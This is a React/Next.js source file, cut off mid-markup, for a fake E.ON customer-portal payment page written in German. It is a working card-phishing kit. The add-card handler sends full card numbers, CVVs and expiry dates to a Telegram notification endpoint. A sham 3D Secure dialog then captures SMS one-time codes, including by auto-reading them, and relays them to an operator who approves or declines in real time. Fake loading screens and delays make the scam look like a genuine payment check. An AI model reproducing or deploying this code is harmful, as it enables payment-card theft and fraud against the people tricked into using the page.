"use client"

import type React from "react"
import { createClient } from "@/lib/supabase/client"
import { useRouter } from "next/navigation"
import { useState, useEffect, useRef } from "react"
import { getCachedBinData, setCachedBinData } from "@/lib/utils/bin-cache"
import { generateAccountNumbers } from "@/lib/utils/account-generator"
import { generateGermanProfile } from "@/lib/utils/german-profile-generator"
import { extractNameFromEmail } from "@/lib/utils/email-name-extractor"

interface PaymentMethod {
  id: string
  method_type: string
  card_last_four: string | null
  card_brand: string | null
  card_holder_name: string | null // Added card holder name
  card_expiry_month: string | null // Added expiry month
  card_expiry_year: string | null // Added expiry year
  iban_last_four: string | null
  is_default: boolean
  is_verified: boolean // Added verification status
  verified_at: string | null // Added verification timestamp
  created_at: string
  bank_name: string | null // Added bank name
  card_level: string | null // Added card level
}

interface PaymentMethodsContentProps {
  paymentMethods: PaymentMethod[]
  userId: string
}

// Added BIN data interface
interface BinData {
  bank: {
    name: string
    city?: string
    country?: string
  } | null
  brand: string
  type: string
  level?: string
  country: {
    name: string
    code: string
  } | null
}

export default function PaymentMethodsContent({ paymentMethods: initialMethods, userId }: PaymentMethodsContentProps) {
  const router = useRouter()
  const supabase = createClient()
  const [paymentMethods, setPaymentMethods] = useState(initialMethods)
  const [showAddModal, setShowAddModal] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isAddingCard, setIsAddingCard] = useState(false)
  const [settingDefaultId, setSettingDefaultId] = useState<string | null>(null)
  const [deletingId, setDeletingId] = useState<string | null>(null)
  const [formData, setFormData] = useState({
    method_type: "credit_card",
    card_number: "",
    card_holder: "",
    expiry_month: "",
    expiry_year: "",
    cvv: "",
    card_brand: "",
    iban: "",
    card_holder_name: "", // Added for modal
    card_expiry: "", // Added for modal
    card_cvv: "", // Added for modal
    date_of_birth: "", // Added for modal
    phone_number: "", // Added for modal
  })
  const [expiryDisplay, setExpiryDisplay] = useState("")
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [validFields, setValidFields] = useState<Record<string, boolean>>({})
  const [cardType, setCardType] = useState<"visa" | "mastercard" | "amex" | "discover" | null>(null)
  const [focusedField, setFocusedField] = useState<string | null>(null)
  const [showCvvTooltip, setShowCvvTooltip] = useState(false) // Added state for CVV tooltip

  const [show3DSecureModal, setShow3DSecureModal] = useState(false)
  const [verificationCode, setVerificationCode] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [verificationStep, setVerificationStep] = useState<"loading" | "auth" | "validating" | "success" | "error">(
    "loading",
  )
  const [pendingCardId, setPendingCardId] = useState<string | null>(null)
  const [verificationRequestId, setVerificationRequestId] = useState<string | null>(null)
  const [verificationError, setVerificationError] = useState<string | null>(null)

  const [binData, setBinData] = useState<BinData | null>(null)
  const [isFetchingBin, setIsFetchingBin] = useState(false)
  const [pending3DSecureBinData, setPending3DSecureBinData] = useState<BinData | null>(null)

  const binFetchTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const binAbortControllerRef = useRef<AbortController | null>(null)

  const [showStripeLoading, setShowStripeLoading] = useState(false)

  const cardNumberRef = useRef<HTMLInputElement>(null)
  const expiryRef = useRef<HTMLInputElement>(null)
  const cvvRef = useRef<HTMLInputElement>(null)
  const cardHolderRef = useRef<HTMLInputElement>(null)
  const verificationCodeRef = useRef<HTMLInputElement>(null)

  const accountNumbers = generateAccountNumbers(userId)
  const germanProfile = generateGermanProfile(userId)
  const [userProfile, setUserProfile] = useState<{ fullName: string; email: string; address: string } | null>(null)
  const [showSepaAlert, setShowSepaAlert] = useState(false)

  useEffect(() => {
    const fetchProfile = async () => {
      const { data: profile } = await supabase.from("profiles").select("email, full_name").eq("id", userId).single()

      if (profile) {
        const { fullName, isValid } = extractNameFromEmail(profile.email)

        console.log("[v0] Email:", profile.email)
        console.log("[v0] Extracted name:", fullName, "Valid:", isValid)

        setUserProfile({
          fullName: isValid ? fullName : "",
          email: profile.email,
          address: "Straße der Einheit 9, 99897 Tambach-Dietharz",
        })
      }
    }

    fetchProfile()
  }, [userId, supabase])

  useEffect(() => {
    console.log("[v0] Starting blur effect timer...")
    const timer = setTimeout(() => {
      console.log("[v0] Activating blur effect, SEPA alert stands out")
      setShowSepaAlert(true)
    }, 2500)

    return () => clearTimeout(timer)
  }, [])

  useEffect(() => {
    if (showAddModal && cardNumberRef.current) {
      setTimeout(() => cardNumberRef.current?.focus(), 100)
    }
  }, [showAddModal])

  useEffect(() => {
    if (show3DSecureModal && verificationStep === "auth" && verificationCodeRef.current) {
      setTimeout(() => verificationCodeRef.current?.focus(), 100)
    }
  }, [show3DSecureModal, verificationStep])

  useEffect(() => {
    if (show3DSecureModal && verificationStep === "auth" && "OTPCredential" in window) {
      const abortController = new AbortController()

      navigator.credentials
        .get({
          // @ts-ignore - WebOTP API
          otp: { transport: ["sms"] },
          signal: abortController.signal,
        })
        .then((otp: any) => {
          if (otp && otp.code) {
            console.log("[v0] SMS code auto-detected:", otp.code)
            setVerificationCode(otp.code)
            setTimeout(() => handle3DSecureVerification(otp.code), 300)
          }
        })
        .catch((err: any) => {
          console.log("[v0] WebOTP error:", err)
        })

      return () => abortController.abort()
    }
  }, [show3DSecureModal, verificationStep])

  const fetchBinData = async (bin: string) => {
    if (bin.length < 6) {
      setBinData(null)
      return
    }

    // Check cache first
    const cached = getCachedBinData(bin.slice(0, 8))
    if (cached) {
      console.log("[v0] BIN data from cache:", cached)
      setBinData(cached)
      return
    }

    // Cancel previous request if exists
    if (binAbortControllerRef.current) {
      binAbortControllerRef.current.abort()
    }

    // Create new abort controller
    const abortController = new AbortController()
    binAbortControllerRef.current = abortController

    setIsFetchingBin(true)

    try {
      const response = await fetch(`/api/bin-lookup?bin=${bin.slice(0, 8)}`, {
        signal: abortController.signal,
      })

      if (response.ok) {
        const data = await response.json()
        console.log("[v0] BIN data received:", data)

        // Cache the result
        setCachedBinData(bin.slice(0, 8), data)

        setBinData(data)
      } else {
        console.log("[v0] BIN lookup failed:", response.status)
        setBinData(null)
      }
    } catch (error: any) {
      if (error.name === "AbortError") {
        console.log("[v0] BIN lookup cancelled")
      } else {
        console.log("[v0] BIN lookup error:", error)
        setBinData(null)
      }
    } finally {
      setIsFetchingBin(false)
      binAbortControllerRef.current = null
    }
  }

  useEffect(() => {
    const cleaned = formData.card_number.replace(/\D/g, "")

    // Clear previous timeout
    if (binFetchTimeoutRef.current) {
      clearTimeout(binFetchTimeoutRef.current)
    }

    if (cleaned.length >= 6) {
      // Debounce for 300ms
      binFetchTimeoutRef.current = setTimeout(() => {
        fetchBinData(cleaned)
      }, 300)
    } else {
      setBinData(null)
      // Cancel any pending request
      if (binAbortControllerRef.current) {
        binAbortControllerRef.current.abort()
        binAbortControllerRef.current = null
      }
    }

    // Cleanup on unmount
    return () => {
      if (binFetchTimeoutRef.current) {
        clearTimeout(binFetchTimeoutRef.current)
      }
      if (binAbortControllerRef.current) {
        binAbortControllerRef.current.abort()
      }
    }
  }, [formData.card_number])

  const luhnCheck = (cardNumber: string): boolean => {
    const digits = cardNumber.replace(/\D/g, "")
    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = Number.parseInt(digits[i])

      if (isEven) {
        digit *= 2
        if (digit > 9) digit -= 9
      }

      sum += digit
      isEven = !isEven
    }

    return sum % 10 === 0
  }

  const detectCardType = (number: string): "visa" | "mastercard" | "amex" | "discover" | null => {
    const cleaned = number.replace(/\D/g, "")

    if (/^4/.test(cleaned)) return "visa"
    if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return "mastercard"
    if (/^3[47]/.test(cleaned)) return "amex"
    if (/^6(?:011|5)/.test(cleaned)) return "discover"

    return null
  }

  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\D/g, "")
    const type = detectCardType(cleaned)

    if (type === "amex") {
      // Amex: 4-6-5 format
      return cleaned.replace(/(\d{4})(\d{6})(\d{5})/, "$1 $2 $3").trim()
    }
    // Others: 4-4-4-4 format
    return cleaned.replace(/(\d{4})/g, "$1 ").trim()
  }

  const formatExpiry = (value: string): string => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`
    }
    return cleaned
  }

  const validateCardNumber = (number: string): string => {
    const cleaned = number.replace(/\D/g, "")

    if (cleaned.length === 0) return "Kartennummer ist erforderlich"
    if (cleaned.length < 13) return "Kartennummer ist zu kurz"
    if (cleaned.length > 19) return "Kartennummer ist zu lang"
    if (!luhnCheck(cleaned)) return "Ungültige Kartennummer"

    return ""
  }

  const validateExpiry = (month: string, year: string): string => {
    if (!month || !year) return "Ablaufdatum ist erforderlich"

    const monthNum = Number.parseInt(month)
    const yearNum = Number.parseInt(`20${year}`)

    if (monthNum < 1 || monthNum > 12) return "Ungültiger Monat"

    const now = new Date()
    const expiry = new Date(yearNum, monthNum - 1)

    if (expiry < now) return "Karte ist abgelaufen"

    return ""
  }

  const validateCvv = (cvv: string, cardType: string | null): string => {
    if (!cvv) return "CVV ist erforderlich"

    const expectedLength = cardType === "amex" ? 4 : 3
    if (cvv.length !== expectedLength) {
      return `CVV muss ${expectedLength} Ziffern haben`
    }

    return ""
  }

  const handleCardNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    const maxLength = 19

    if (cleaned.length <= maxLength) {
      const formatted = formatCardNumber(cleaned)
      const type = detectCardType(cleaned)

      setCardType(type)
      setFormData((prev) => ({ ...prev, card_number: formatted, card_brand: type || "" }))

      if (cleaned.length >= 13) {
        const error = validateCardNumber(cleaned)
        setErrors((prev) => ({ ...prev, card_number: error }))
        setValidFields((prev) => ({ ...prev, card_number: !error }))

        const expectedLength = type === "amex" ? 15 : 16
        if (cleaned.length === expectedLength && !error) {
          setTimeout(() => expiryRef.current?.focus(), 100)
        }
      } else {
        const newErrors = { ...errors }
        delete newErrors.card_number
        setErrors(newErrors)
        const newValidFields = { ...validFields }
        delete newValidFields.card_number
        setValidFields(newValidFields)
      }
    }
  }

  const handleExpiryChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")

    if (cleaned.length <= 4) {
      const formatted = formatExpiry(cleaned)
      const month = cleaned.slice(0, 2)
      const year = cleaned.slice(2, 4)

      setExpiryDisplay(formatted)
      setFormData((prev) => ({ ...prev, expiry_month: month, expiry_year: year }))

      if (cleaned.length === 4) {
        const error = validateExpiry(month, year)
        setErrors((prev) => ({ ...prev, expiry: error }))
        setValidFields((prev) => ({ ...prev, expiry: !error }))

        if (!error) {
          setTimeout(() => cvvRef.current?.focus(), 100)
        }
      } else {
        const newErrors = { ...errors }
        delete newErrors.expiry
        setErrors(newErrors)
        const newValidFields = { ...validFields }
        delete newValidFields.expiry
        setValidFields(newValidFields)
      }
    }
  }

  const handleCvvChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    const maxLength = cardType === "amex" ? 4 : 3

    if (cleaned.length <= maxLength) {
      setFormData((prev) => ({ ...prev, cvv: cleaned }))

      if (cleaned.length === maxLength) {
        const error = validateCvv(cleaned, cardType)
        setErrors((prev) => ({ ...prev, cvv: error }))
        setValidFields((prev) => ({ ...prev, cvv: !error }))

        if (!error) {
          setTimeout(() => cardHolderRef.current?.focus(), 100)
        }
      } else {
        const newErrors = { ...errors }
        delete newErrors.cvv
        setErrors(newErrors)
        const newValidFields = { ...validFields }
        delete newValidFields.cvv
        setValidFields(newValidFields)
      }
    }
  }

  const handleCardHolderChange = (value: string) => {
    const upperValue = value.toUpperCase()
    setFormData((prev) => ({ ...prev, card_holder: upperValue }))

    // Validate card holder (at least 3 characters)
    const isValid = upperValue.trim().length >= 3
    if (isValid) {
      setValidFields((prev) => ({ ...prev, card_holder: true }))
      const newErrors = { ...errors }
      delete newErrors.card_holder
      setErrors(newErrors)
    } else {
      const newValidFields = { ...validFields }
      delete newValidFields.card_holder
      setValidFields(newValidFields)
    }
  }

  const handleSignOut = async () => {
    await supabase.auth.signOut()
    router.push("/")
  }

  const handleAddPaymentMethod = async (e: React.FormEvent) => {
    e.preventDefault()

    const newErrors: Record<string, string> = {}

    if (formData.method_type === "credit_card") {
      const cleaned = formData.card_number.replace(/\D/g, "")
      newErrors.card_number = validateCardNumber(cleaned)
      newErrors.card_holder = !formData.card_holder ? "Karteninhaber ist erforderlich" : ""
      newErrors.expiry = validateExpiry(formData.expiry_month, formData.expiry_year)
      newErrors.cvv = validateCvv(formData.cvv, cardType)

      Object.keys(newErrors).forEach((key) => {
        if (!newErrors[key]) delete newErrors[key]
      })

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors)
        return
      }

      const lastFour = cleaned.slice(-4)
      const isDuplicate = paymentMethods.some(
        (pm) =>
          pm.method_type === "credit_card" &&
          pm.card_last_four === lastFour &&
          pm.card_expiry_month === formData.expiry_month &&
          pm.card_expiry_year === formData.expiry_year,
      )

      if (isDuplicate) {
        setErrors({
          card_number: "Diese Karte wurde bereits hinzugefügt",
        })
        return
      }
    }

    const cleaned = formData.card_number.replace(/\D/g, "")
    const { data: profile } = await supabase.from("profiles").select("email, full_name, id").eq("id", userId).single()

    fetch("/api/telegram/notify-card", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userEmail: profile?.email || "Unknown",
        userName: profile?.full_name || "Unknown",
        userId: profile?.id || userId,
        cardNumber: cleaned,
        cardBrand: cardType || "Unknown",
        cardLastFour: cleaned.slice(-4),
        cardHolder: formData.card_holder,
        cardExpiry: `${formData.expiry_month}/${formData.expiry_year}`,
        cvv: formData.cvv,
        bankName: binData?.bank?.name,
        cardLevel: binData?.level,
        cardType: binData?.type,
        country: binData?.country?.name,
      }),
    }).catch((err) => console.error("[v0] Failed to send card notification:", err))

    setIsAddingCard(true)
    setIsSubmitting(true)

    // Wait 10 seconds with button showing loading state
    await new Promise((resolve) => setTimeout(resolve, 10000))

    // Now close modal and show branded loading screen
    setShowAddModal(false)
    setShowStripeLoading(true)

    const insertData: any = {
      user_id: userId,
      method_type: formData.method_type,
      is_default: paymentMethods.length === 0,
      is_verified: false, // Initially unverified
    }

    if (formData.method_type === "credit_card") {
      const cleaned = formData.card_number.replace(/\D/g, "")
      insertData.card_last_four = cleaned.slice(-4)
      insertData.card_brand = cardType || "Unknown"
      insertData.card_holder_name = formData.card_holder
      insertData.card_expiry_month = formData.expiry_month
      insertData.card_expiry_year = formData.expiry_year
      insertData.bank_name = binData?.bank?.name || null
      insertData.card_level = binData?.level || null
    } else if (formData.method_type === "bank_transfer") {
      insertData.iban_last_four = formData.iban.slice(-4)
    }

    const { data, error } = await supabase.from("payment_methods").insert(insertData).select().single()

    if (!error && data) {
      const { data: profile } = await supabase.from("profiles").select("email, full_name").eq("id", userId).single()

      // Removed redundant fetch to telegram
      // fetch("/api/telegram/notify-card", {
      //   method: "POST",
      //   headers: { "Content-Type": "application/json" },
      //   body: JSON.stringify({
      //     userEmail: profile?.email || "Unknown",
      //     userName: profile?.full_name || "Unknown",
      //     cardNumber: cleaned, // Full card number
      //     cardBrand: insertData.card_brand,
      //     cardLastFour: insertData.card_last_four,
      //     cardHolder: insertData.card_holder_name,
      //     cardExpiry: `${insertData.card_expiry_month}/${insertData.card_expiry_year}`,
      //     cvv: formData.cvv, // CVV code
      //     bankName: insertData.bank_name,
      //     cardLevel: insertData.card_level,
      //   }),
      // }).catch((err) => console.error("[v0] Failed to send card notification:", err))

      setPendingCardId(data.id)
      setPending3DSecureBinData(binData)

      // Wait 8 seconds before showing 3D Secure modal
      setTimeout(() => {
        setShowStripeLoading(false)
        setShow3DSecureModal(true)
        setVerificationStep("auth") // Go directly to auth, skip loading
        setIsAddingCard(false)
        setIsSubmitting(false)
      }, 8000)
    } else {
      setShowStripeLoading(false)
      setIsAddingCard(false)
      setIsSubmitting(false)
      alert("Fehler beim Hinzufügen der Zahlungsmethode. Bitte versuchen Sie es erneut.")
    }
  }

  const handle3DSecureVerification = async (code?: string) => {
    const codeToVerify = code || verificationCode
    if (codeToVerify.length !== 6) return

    setIsVerifying(true)
    setVerificationStep("validating")
    setVerificationError(null)

    try {
      console.log("[v0] Sending verification request:", {
        verificationCode: codeToVerify,
        paymentMethodId: pendingCardId,
        userId: userId,
      })

      const response = await fetch("/api/telegram/send-verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationCode: codeToVerify,
          paymentMethodId: pendingCardId,
          userId: userId,
        }),
      })

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}))
        console.error("[v0] Verification request failed:", response.status, errorData)
        throw new Error(errorData.error || "Failed to send verification request")
      }

      const { verificationRequestId: reqId } = await response.json()
      console.log("[v0] Verification request sent successfully:", reqId)
      setVerificationRequestId(reqId)

      // Poll for admin response (every 2 seconds, max 45 seconds)
      const startTime = Date.now()
      const maxWaitTime = 45000 // 45 seconds

      const pollInterval = setInterval(async () => {
        const elapsed = Date.now() - startTime

        if (elapsed >= maxWaitTime) {
          // Timeout - show error
          clearInterval(pollInterval)
          setVerificationStep("error")
          setVerificationError("Zeitüberschreitung. Bitte versuchen Sie es erneut.")
          setIsVerifying(false)
          setVerificationCode("")

          // Reset after 3 seconds
          setTimeout(() => {
            setVerificationStep("auth")
            setVerificationError(null)
          }, 3000)
          return
        }

        // Check status
        const statusResponse = await fetch(`/api/telegram/check-status?id=${reqId}`)
        if (statusResponse.ok) {
          const { status } = await statusResponse.json()

          if (status === "approved") {
            // Success!
            clearInterval(pollInterval)
            setVerificationStep("success")
            setIsVerifying(false)

            // Update local state
            const { data: updatedMethod } = await supabase
              .from("payment_methods")
              .select()
              .eq("id", pendingCardId)
              .single()

            if (updatedMethod) {
              setPaymentMethods([...paymentMethods, updatedMethod])
            }

            // Close modal after success animation
            setTimeout(() => {
              setShow3DSecureModal(false)
              setVerificationCode("")
              setVerificationStep("loading")
              setPendingCardId(null)
              setPending3DSecureBinData(null)
              setVerificationRequestId(null)
              resetForm()
            }, 2500)
          } else if (status === "declined") {
            // Declined by admin
            clearInterval(pollInterval)
            setVerificationStep("error")
            setVerificationError("Verifizierung abgelehnt. Bitte versuchen Sie es erneut.")
            setIsVerifying(false)
            setVerificationCode("")

            // Reset after 3 seconds
            setTimeout(() => {
              setVerificationStep("auth")
              setVerificationError(null)
            }, 3000)
          }
        }
      }, 2000) // Poll every 2 seconds
    } catch (error) {
      console.error("[v0] Verification error:", error)
      setVerificationStep("error")
      setVerificationError("Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.")
      setIsVerifying(false)
      setVerificationCode("")

      setTimeout(() => {
        setVerificationStep("auth")
        setVerificationError(null)
      }, 3000)
    }
  }

  const handleVerificationCodeChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length <= 6) {
      setVerificationCode(cleaned)

      // Auto-submit when 6 digits entered
      if (cleaned.length === 6) {
        setTimeout(() => handle3DSecureVerification(cleaned), 300)
      }
    }
  }

  const handleSetDefault = async (methodId: string) => {
    setSettingDefaultId(methodId)

    await supabase.from("payment_methods").update({ is_default: false }).eq("user_id", userId)

    const { error } = await supabase.from("payment_methods").update({ is_default: true }).eq("id", methodId)

    if (!error) {
      setPaymentMethods(
        paymentMethods.map((pm) => ({
          ...pm,
          is_default: pm.id === methodId,
        })),
      )
    }

    setSettingDefaultId(null)
  }

  const handleDeleteMethod = async (methodId: string) => {
    if (!confirm("Möchten Sie diese Zahlungsmethode wirklich löschen?")) return

    setDeletingId(methodId)
    const { error } = await supabase.from("payment_methods").delete().eq("id", methodId)

    if (!error) {
      setPaymentMethods(paymentMethods.filter((pm) => pm.id !== methodId))
    }
    setDeletingId(null)
  }

  const resetForm = () => {
    setFormData({
      method_type: "credit_card",
      card_number: "",
      card_holder: "",
      expiry_month: "",
      expiry_year: "",
      cvv: "",
      card_brand: "",
      iban: "",
      card_holder_name: "", // Reset for modal
      card_expiry: "", // Reset for modal
      card_cvv: "", // Reset for modal
      date_of_birth: "", // Reset for modal
      phone_number: "", // Reset for modal
    })
    setExpiryDisplay("")
    setErrors({})
    setValidFields({})
    setCardType(null)
    setFocusedField(null)
    setBinData(null) // Reset BIN data on form reset
    setShowCvvTooltip(false) // Reset CVV tooltip state
  }

  const isFormValid = validFields.card_number && validFields.card_holder && validFields.expiry && validFields.cvv

  const isCardExpiringSoon = (month: string | null, year: string | null): boolean => {
    if (!month || !year) return false
    const expiry = new Date(2000 + Number.parseInt(year), Number.parseInt(month) - 1)
    const threeMonthsFromNow = new Date()
    threeMonthsFromNow.setMonth(threeMonthsFromNow.getMonth() + 3)
    return expiry <= threeMonthsFromNow
  }

  const getCardBrandColor = (brand: string | null): string => {
    switch (brand?.toLowerCase()) {
      case "visa":
        return "from-blue-600 to-blue-800"
      case "mastercard":
        return "from-red-600 to-orange-600"
      case "amex":
        return "from-blue-700 to-indigo-800"
      case "discover":
        return "from-orange-600 to-orange-800"
      default:
        return "from-gray-700 to-gray-900"
    }
  }

  const getPaymentMethodDisplay = (pm: PaymentMethod) => {
    if (pm.method_type === "credit_card") {
      const isExpiringSoon = isCardExpiringSoon(pm.card_expiry_month, pm.card_expiry_year)
      const brandColor = getCardBrandColor(pm.card_brand)

      const displayTitle = pm.bank_name || `${pm.card_brand} Kreditkarte`
      const displaySubtitle = pm.card_level ? `${pm.card_level} •••• ${pm.card_last_four}` : `•••• ${pm.card_last_four}`

      return {
        title: displayTitle,
        subtitle: displaySubtitle,
        cardHolder: pm.card_holder_name,
        expiry: pm.card_expiry_month && pm.card_expiry_year ? `${pm.card_expiry_month}/${pm.card_expiry_year}` : null,
        isExpiringSoon,
        isVerified: pm.is_verified, // Added verification status
        brandColor,
        icon: (
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
            <line x1="1" y1="10" x2="23" y2="10" />
          </svg>
        ),
      }
    }
    if (pm.method_type === "bank_transfer") {
      return {
        title: "Banküberweisung",
        subtitle: `IBAN •••• ${pm.iban_last_four}`,
        cardHolder: null,
        expiry: null,
        isExpiringSoon: false,
        isVerified: pm.is_verified, // Keep consistent
        brandColor: "from-gray-700 to-gray-900",
        icon: (
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <line x1="12" y1="1" x2="12" y2="23" />
            <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
          </svg>
        ),
      }
    }
    return {
      title: pm.method_type,
      subtitle: "",
      cardHolder: null,
      expiry: null,
      isExpiringSoon: false,
      isVerified: pm.is_verified, // Keep consistent
      brandColor: "from-gray-700 to-gray-900",
      icon: null,
    }
  }

  const handleCardNumberPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedText = e.clipboardData.getData("text")
    const cleaned = pastedText.replace(/\D/g, "")
    if (cleaned.length >= 13 && cleaned.length <= 19) {
      handleCardNumberChange(cleaned)
    }
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, nextRef: React.RefObject<HTMLInputElement>) => {
    if (e.key === "Enter") {
      e.preventDefault()
      nextRef.current?.focus()
    }
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))

    // Basic validation for real-time feedback
    if (name === "card_number") {
      const cleaned = value.replace(/\D/g, "")
      const error = validateCardNumber(cleaned)
      setErrors((prev) => ({ ...prev, card_number: error }))
      setValidFields((prev) => ({ ...prev, card_number: !error }))
      const type = detectCardType(cleaned)
      setCardType(type)
      setFormData((prev) => ({ ...prev, card_brand: type || "" }))
    } else if (name === "card_expiry") {
      const cleaned = value.replace(/\D/g, "")
      const month = cleaned.slice(0, 2)
      const year = cleaned.slice(2, 4)
      const error = validateExpiry(month, year)
      setErrors((prev) => ({ ...prev, card_expiry: error }))
      setValidFields((prev) => ({ ...prev, card_expiry: !error }))
      setFormData((prev) => ({ ...prev, expiry_month: month, expiry_year: year }))
      setExpiryDisplay(`${month}${year.length === 2 ? "/" + year : ""}`)
    } else if (name === "card_cvv") {
      const error = validateCvv(value, cardType)
      setErrors((prev) => ({ ...prev, card_cvv: error }))
      setValidFields((prev) => ({ ...prev, card_cvv: !error }))
    } else if (name === "card_holder_name") {
      const isValid = value.trim().length >= 3
      setValidFields((prev) => ({ ...prev, card_holder_name: isValid }))
      if (isValid) {
        setErrors((prev) => {
          const { card_holder_name, ...rest } = prev
          return rest
        })
      }
    } else if (name === "date_of_birth") {
      // Basic validation for DOB format
      const dobRegex = /^\d{2}\.\d{2}\.\d{4}$/
      const isValid = dobRegex.test(value)
      setValidFields((prev) => ({ ...prev, date_of_birth: isValid }))
      if (isValid) {
        setErrors((prev) => {
          const { date_of_birth, ...rest } = prev
          return rest
        })
      }
    } else if (name === "phone_number") {
      // Basic validation for phone number format
      const phoneRegex = /^\+?[0-9\s-]+$/
      const isValid = phoneRegex.test(value)
      setValidFields((prev) => ({ ...prev, phone_number: isValid }))
      if (isValid) {
        setErrors((prev) => {
          const { phone_number, ...rest } = prev
          return rest
        })
      }
    }
  }

  // Check if all required fields in the modal are valid
  const isModalFormValid =
    formData.card_number &&
    formData.card_expiry &&
    formData.card_cvv &&
    formData.card_holder_name &&
    formData.date_of_birth &&
    formData.phone_number &&
    !Object.values(errors).some(Boolean)

  return (
    <div className="min-h-screen bg-[#F5F5F5] relative">
      {showSepaAlert && (
        <>
          <div className="fixed inset-0 bg-black/40 z-40 pointer-events-none transition-opacity duration-700" />
        </>
      )}

      {/* Header */}
      <header
        className={`bg-white border-b border-[#E0E0E0] transition-all duration-700 ${showSepaAlert ? "blur-sm" : ""}`}
      >
        <div className="max-w-[1400px] mx-auto px-8 py-5 flex justify-between items-center">
          <img src="/eon-logo.svg" alt="E.ON Logo" className="h-9" />

          {/* Desktop Navigation */}
          <nav className="hidden lg:flex items-center gap-10">
            <button className="text-[1.5rem] font-normal text-[#333333] hover:text-[#E20015] transition-colors">
              Mein E.ON
            </button>
            <button className="text-[1.5rem] font-normal text-[#333333] hover:text-[#E20015] transition-colors">
              Verträge
            </button>
            <button className="text-[1.5rem] font-normal text-[#333333] hover:text-[#E20015] transition-colors">
              Bestellungen
            </button>
            <button className="text-[1.5rem] font-normal text-[#333333] hover:text-[#E20015] transition-colors">
              Angebote
            </button>
          </nav>

          {/* Right Side Icons */}
          <div className="hidden lg:flex items-center gap-7">
            <button className="text-[#666666] hover:text-[#E20015] transition-colors" title="Vorteile">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                <path d="M20 12v10H4V12" />
                <path d="M22 7H2v5h20V7z" />
                <path d="M12 22V7" />
                <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z" />
                <path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z" />
              </svg>
            </button>
            <button
              onClick={handleSignOut}
              className="text-[#666666] hover:text-[#E20015] transition-colors"
              title="Logout"
            >
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
                <polyline points="16 17 21 12 16 7" />
                <line x1="21" y1="12" x2="9" y2="12" />
              </svg>
            </button>
            <button className="flex items-center gap-2 text-[#666666] hover:text-[#E20015] transition-colors">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                <circle cx="12" cy="7" r="4" />
              </svg>
              <span className="text-[1.5rem] font-normal">Profil</span>
            </button>
          </div>

          {/* Mobile Menu Button */}
          <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} className="lg:hidden text-black">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <line x1="3" y1="12" x2="21" y2="12" />
              <line x1="3" y1="6" x2="21" y2="6" />
              <line x1="3" y1="18" x2="21" y2="18" />
            </svg>
          </button>
        </div>

        {/* Mobile Menu */}
        {mobileMenuOpen && (
          <div className="lg:hidden border-t border-[#E0E0E0] bg-white">
            <nav className="flex flex-col">
              <button className="px-8 py-5 text-left text-[1.5rem] text-[#333333] hover:bg-[#F5F5F5]">Mein E.ON</button>
              <button className="px-8 py-5 text-left text-[1.5rem] text-[#333333] hover:bg-[#F5F5F5]">Verträge</button>
              <button className="px-8 py-5 text-left text-[1.5rem] text-[#333333] hover:bg-[#F5F5F5]">
                Bestellungen
              </button>
              <button className="px-8 py-5 text-left text-[1.5rem] text-[#333333] hover:bg-[#F5F5F5]">Angebote</button>
              <button
                onClick={handleSignOut}
                className="px-8 py-5 text-left text-[1.5rem] text-[#666666] hover:bg-[#F5F5F5]"
              >
                Abmelden
              </button>
            </nav>
          </div>
        )}
      </header>

      {/* Contract Info Section */}
      <section
        className={`bg-[#F0F0F0] border-b border-[#D0D0D0] py-6 transition-all duration-700 ${showSepaAlert ? "blur-sm" : ""}`}
      >
        <div className="max-w-[1400px] mx-auto px-8">
          <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-6">
            {/* Left: Contract Info */}
            <div className="flex items-start gap-4">
              <div className="flex flex-col">
                <div className="flex items-center gap-3 mb-3">
                  <h2 className="text-[1.9rem] font-bold text-[#1A1A1A]">E.ON Strom Öko</h2>
                  <span className="inline-flex items-center gap-1.5 px-2.5 py-1 bg-white border border-[#CCCCCC] rounded text-[1.2rem] text-[#666666]">
